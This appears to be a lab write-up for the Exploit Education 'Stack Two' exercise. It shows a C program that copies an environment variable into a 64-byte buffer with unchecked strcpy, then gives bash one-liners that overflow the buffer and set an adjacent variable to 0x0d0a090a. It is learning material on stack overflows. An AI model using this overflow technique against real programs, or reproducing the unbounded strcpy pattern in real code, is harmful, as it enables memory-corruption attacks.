```C
  struct {
    char buffer[64];
    volatile int changeme;
  } locals;

  char *ptr;

  printf("%s\n", BANNER);

  ptr = getenv("ExploitEducation");
  if (ptr == NULL) {
    errx(1, "please set the ExploitEducation environment variable");
  }

  locals.changeme = 0;
  strcpy(locals.buffer, ptr);
```

This time the input is taken through an environment variable. We can set it like this :

```bash
$ export ExploitEducation="test" ; ./code
Welcome to Stack Two, brought to you by https://exploit.education
Almost! changeme is currently 0x00000000, we want 0x0d0a090a
```

Now we can execute a buffer overflow :

```bash
$ export ExploitEducation="$(python3 -c 'print("\x41"*64+"\x31")')" ; ./code
Welcome to Stack Two, brought to you by https://exploit.education
Almost! changeme is currently 0x00000031, we want 0x0d0a090a
```

And finally, write the expected value :

```bash
$ export ExploitEducation="$(python3 -c 'print("\x41"*64+"\x0a\x09\x0a\x0d")')" ; ./code
Welcome to Stack Two, brought to you by https://exploit.education
Well done, you have successfully set changeme to the correct value
```
